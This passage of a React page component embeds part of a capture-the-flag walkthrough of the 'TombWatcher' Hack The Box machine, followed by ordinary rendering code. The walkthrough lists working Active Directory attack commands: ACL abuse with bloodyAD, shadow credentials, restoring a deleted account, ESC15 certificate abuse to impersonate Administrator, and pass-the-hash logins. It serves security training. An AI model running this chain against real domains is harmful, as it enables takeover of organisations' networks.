bloodyAD --host "DC01.tombwatcher.htb" -d "tombwatcher.htb" -u "sam" -p 'P@ssw0rd!' set owner john sam
bloodyAD --host "DC01.tombwatcher.htb" -d "tombwatcher.htb" -u 'sam' -p 'P@ssw0rd!' add genericAll john sam
ftime -d tombwatcher.htb certipy shadow auto -u sam@10.129.71.89 -p 'P@ssw0rd!' -dc-ip 10.129.71.89 -account john
\`\`\`
![Service Enumeration](/images/writeups/tombwatcher/16.png)

We also can use the same steps but to set a new password to \`John\` user.
\`\`\`bash
bloodyAD --host "DC01.tombwatcher.htb" -d "tombwatcher.htb" -u "sam" -p 'P@ssw0rd!' set owner john sam
bloodyAD --host "DC01.tombwatcher.htb" -d "tombwatcher.htb" -u 'sam' -p 'P@ssw0rd!' add genericAll john sam
bloodyAD --host "DC01.tombwatcher.htb" -d "tombwatcher.htb" -u 'sam' -p 'P@ssw0rd!' set password john Password123
\`\`\`

Authenticating as \`John\` user and retrieving the user flag.
\`\`\`bash
evil-winrm -i tombwatcher.htb -u john -H ad9324754583e3e42b55aad4d3b8d2bf
\`\`\`
![Service Enumeration](/images/writeups/tombwatcher/17.png)

## Privilege Escalation
### Lateral Movement - Tombstone
Using the Active Directory Powershell module to list the deleted objects, this will retrieve information about the \`cert_admin\` deleted account.
\`\`\`powershell
Get-ADObject -IncludeDeletedObjects -Filter 'isDeleted -eq $true'
\`\`\`
![Service Enumeration](/images/writeups/tombwatcher/20.png)

Running \`certipy\` to enumerate the ADCS services, we will find information about the \`WebServer\` template and the SID from an account that have an enroll permission.
\`\`\`bash
certipy find -u 'john@tombwatcher.htb' -hashes ad9324754583e3e42b55aad4d3b8d2bf -dc-ip '10.129.252.244' -text -enabled -hide-admins
\`\`\`
![Service Enumeration](/images/writeups/tombwatcher/22.png)

Searching information about that SID, will return about the \`cert_admin\` account.
\`\`\`powershell
Get-ADObject -IncludeDeletedObjects -Filter "objectSid -eq 'S-1-5-21-1392491010-1358638721-2126982587-1111'" -Properties *
\`\`\`
![Service Enumeration](/images/writeups/tombwatcher/30.png)

Restoring the \`cert_admin\` account and setting a new password.
\`\`\`powershell
Restore-ADObject -Identity "938182c3-bf0b-410a-9aaa-45c8e1a02ebf"
Set-ADAccountPassword -Identity "cert_admin" -Reset -NewPassword (ConvertTo-SecureString "Winter2025!" -AsPlainText -Force)
Enable-ADAccount -Identity "cert_admin"
\`\`\`

Validating the \`cert_admin\` credentials.
\`\`\`bash
nxc smb tombwatcher.htb -u cert_admin -p 'Winter2025!'
\`\`\`
![Service Enumeration](/images/writeups/tombwatcher/24.png)

### Lateral Movement - ESC15
For the ADCS enumeration we can use the \`certipy\` tool to find vulnerable templates and request a certificate. In this case retuned that the \`WebServer\` template is vulnerable to ESC15.
\`\`\`bash
certipy find -u cert_admin@tombwatcher.htb -p 'Winter2025!' -vulnerable -stdout 
\`\`\`
![Service Enumeration](/images/writeups/tombwatcher/25.png)
![Service Enumeration](/images/writeups/tombwatcher/26.png)

Looking at the certipy wiki, we can follow the ESC15 step two, to request a certificate using the \`WebServer\` template. First we need to request a certificate from a V1 template (with "Enrollee supplies subject"), injecting "Certificate Request Agent" Application Policy.
\`\`\`bash
certipy req -u 'cert_admin@tombwatcher.htb' -p 'Winter2025!' -dc-ip '10.129.192.159' -target 'DC01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -application-policies 'Certificate Request Agent'
\`\`\`

Using the "agent" certificate to request a certificate on behalf of a target privileged user
\`\`\`bash
certipy req -u 'cert_admin@tombwatcher.htb' -p 'Winter2025!' -dc-ip '10.129.192.159' -target 'DC01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'User' -pfx cert_admin.pfx -on-behalf-of 'tombwatcher\\Administrator'
\`\`\`
![Service Enumeration](/images/writeups/tombwatcher/27.png)

Authenticating as the privileged user using the "on behalf of" certificate. This will return the hash of the \`Administrator\` user.
\`\`\`bash
ftime -d tombwatcher.htb certipy auth -pfx 'administrator.pfx' -dc-ip '10.129.192.159'
\`\`\`
![Service Enumeration](/images/writeups/tombwatcher/28.png)

### Root Flag
Authenticating as \`Administrator\` user and retrieving the root flag.
\`\`\`bash
evil-winrm -i tombwatcher.htb -u Administrator -H f61db423bebe3328d33af26741afe5fc
\`\`\`
![Service Enumeration](/images/writeups/tombwatcher/29.png)

# Conclusion

TombWatcher is a medium-difficulty Windows Active Directory machine that demonstrates a complex attack chain involving multiple Active Directory exploitation techniques. The machine showcases real-world scenarios commonly encountered in enterprise environments, particularly focusing on Active Directory Certificate Services (ADCS) vulnerabilities and advanced privilege escalation paths.

The initial access was achieved through provided credentials for the **henry** account. From there, the attack path involved:

• **Kerberoasting via WriteSPN**: Exploiting the \`WriteSPN\` privilege on the \`Alfred\` account using [targeted Kerberoasting techniques](https://github.com/ShutdownRepo/targetedKerberoast)
• **AddSelf Privilege Abuse**: Leveraging \`AddSelf\` permissions to add the compromised user to privileged groups
• **GMSA Password Extraction**: Reading Group Managed Service Account passwords using [NetExec GMSA module](https://www.netexec.wiki/ldap-protocol/dump-gmsa)
• **ForceChangePassword**: Utilizing password reset privileges with [BloodyAD framework](https://github.com/CravateRouge/bloodyAD)
• **WriteOwner Exploitation**: Changing object ownership and granting full control permissions
• **Tombstone Object Recovery**: Discovering and restoring [deleted Active Directory objects](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/get-started/replication/active-directory-replication-concepts#tombstone-lifetime) (tombstone reanimation)
• **ESC15 (ADCS Vulnerability)**: Exploiting Active Directory Certificate Services misconfiguration using [Certipy ESC15 technique](https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc15-arbitrary-application-policy-injection-in-v1-templates-cve-2024-49019-ekuwu) to request certificates on behalf of privileged users

**Tools Used**: Nmap, NetExec (nxc), Rusthound-ce, BloodHound, TargetedKerberoast.py, John the Ripper, BloodyAD, Certipy, Evil-WinRM, Impacket Suite, PowerShell AD Module

The machine emphasizes the importance of proper Active Directory security hardening, particularly around Certificate Services configuration, ACL management, service account security (GMSA), and defense against certificate-based attacks. This writeup demonstrates that even with limited initial access, multiple chained vulnerabilities in Active Directory can lead to complete domain compromise.`
  };

  return (
    <>
      <DynamicSEO 
        type="writeup" 
        data={{
          title: writeup.title,
          excerpt: writeup.excerpt,
          id: writeup.id,
          image_url: '/images/writeups/tombwatcher/machine.png',
          os_type: writeup.os,
          difficulty: writeup.difficulty,
          tags: writeup.tags
        }} 
      />
      <motion.div 
        className="writeup-detail-page"
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.6 }}
      >
      <div className="writeup-header">
        <Link to="/writeups" className="back-button">
          <FaArrowLeft />
          <span>Back to Writeups</span>
        </Link>
        
        <motion.div 
          className="writeup-title-section"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.2, duration: 0.6 }}
        >
          <h1>{writeup.title}</h1>
          
          <div className="writeup-meta">
            <div className="meta-item">
              <FaCalendar />
              <span>{writeup.date}</span>
            </div>
          </div>

          <div className="writeup-tags">
            {writeup.tags.map((tag, index) => (
              <motion.span
                key={tag}
                className="tag-badge"
                initial={{ scale: 0, opacity: 0 }}
                animate={{ scale: 1, opacity: 1 }}
                transition={{ delay: 0.3 + index * 0.1, duration: 0.3 }}
                whileHover={{ scale: 1.1 }}
                style={{ cursor: 'pointer' }}
                onClick={() => navigate(`/tags/${String(tag).toLowerCase()}`)}
              >
                {tag}
              </motion.span>
            ))}
          </div>
          
          <div className="machine-info">
            <div className="machine-info-content">
              <div className="machine-info-left">
                <h6><FaServer /> Machine Information:</h6>
                <div className="machine-info-vertical">
                  <div className="info-item">
                    <FaDesktop /> OS: 
                    <img 
                      src={`/os-icons/${writeup.os}.png`} 
                      alt={`${writeup.os} Icon`} 
                      className="os-icon"
                      onError={(e) => {
                        e.target.style.display = 'none';
                        e.target.nextSibling.style.display = 'inline';
                      }}
                    />
                  </div>
                  <div className="info-item">
                    <FaStar /> Difficulty: {writeup.difficulty}
                  </div>
                  <div className="info-item">
                    <FaNetworkWired /> IP: {writeup.ip}
                  </div>
                </div>
              </div>
              <div className="machine-info-right">
                <img src="/images/writeups/tombwatcher/machine.png" alt="TombWatcher" className="machine-image" />
              </div>
            </div>
          </div>
        </motion.div>
      </div>

      <div className="writeup-layout">
        <motion.div 
          className="writeup-content"
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ delay: 0.4, duration: 0.6 }}
        >
          <div className="markdown-content">
            {(() => {
              const lines = writeup.content.split('\n');
              const elements = [];
              let i = 0;
              
              while (i < lines.length) {
                const line = lines[i];
                
                if (line.startsWith('# ')) {
                  elements.push(<h1 key={i}>{parseInlineMarkdown(line.substring(2))}</h1>);
                } else if (line.startsWith('## ')) {
                  elements.push(<h2 key={i}>{parseInlineMarkdown(line.substring(3))}</h2>);
                } else if (line.startsWith('### ')) {
                  elements.push(<h3 key={i}>{parseInlineMarkdown(line.substring(4))}</h3>);
                } else if (line.startsWith('```')) {
                  // Handle code blocks with CodeBlock component
                  const language = line.substring(3).trim();
                  const codeLines = [];
                  i++;
                  
                  while (i < lines.length && !lines[i].startsWith('```')) {
                    codeLines.push(lines[i]);
                    i++;
                  }
                  
                  elements.push(
                    <CodeBlock key={i} language={language}>
                      {codeLines.join('\n')}
                    </CodeBlock>
                  );
                } else if (line.startsWith('![')) {
                  // Handle images
                  const match = line.match(/!\[(.*?)\]\((.*?)\)/);
                  if (match) {
                    const [, alt, src] = match;
                    elements.push(
                      <div key={i} className="image-container">
                        <img src={src} alt={alt} className="content-image" />
                      </div>
                    );
                  }
                } else if (line.startsWith('<InfoStatus')) {
                  // Handle InfoStatus component
                  const titleMatch = line.match(/title="([^"]*)"/);
                  const messageMatch = line.match(/message="([^"]*)"/);
                  if (titleMatch && messageMatch) {
                    elements.push(
                      <InfoStatus 
                        key={i} 
                        title={titleMatch[1]} 
                        message={messageMatch[1]} 
                      />
                    );
                  }
                } else if (line.trim()) {
                  elements.push(<p key={i}>{parseInlineMarkdown(line)}</p>);
                } else {
                  elements.push(<br key={i} />);
                }
                
                i++;
              }
              
              return elements;
            })()}
          </div>
        </motion.div>
        <TableOfContents content={writeup.content} />
      </div>
      
      <ScrollToTop />
      </motion.div>
    </>
  );
};

export default TombwatcherWalkthrough;
